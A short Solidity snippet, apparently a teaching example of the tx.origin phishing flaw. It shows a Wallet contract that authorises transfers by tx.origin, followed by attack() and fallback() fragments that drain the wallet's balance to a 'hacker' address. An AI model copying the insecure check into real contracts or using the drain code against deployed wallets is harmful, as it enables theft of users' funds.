contract Wallet {
   address public owner;
 
   // set my deployer as my owner:
   constructor() payable {
       owner = msg.sender;
   }
 
   // send Eth to any address _to via transfer function if 
   //  the originator of the transaction is the owner of 
   // this smart contract:
 
 
 
function transfer(address payable _to, uint _amount) public {
          require(tx.origin == owner);
 
          (bool sent, ) = _to.call{value: _amount}("");
          require(sent, "Failed to send Ether");
     }
}

// To steal the funds:
 
   // Make the Owner of Wallet call this function:
   function attack() public {
       // Transfer Wallet's funds to the hacker
       wallet.transfer(hacker, address(wallet).balance);
   }
 
   // Or make the owner send some Eth to this contract's address
   // which will trigger fallback() like this:
   fallback() payable {
       // Transfer Wallet's funds to the hacker
       wallet.transfer(hacker, address(wallet).balance);
   }   
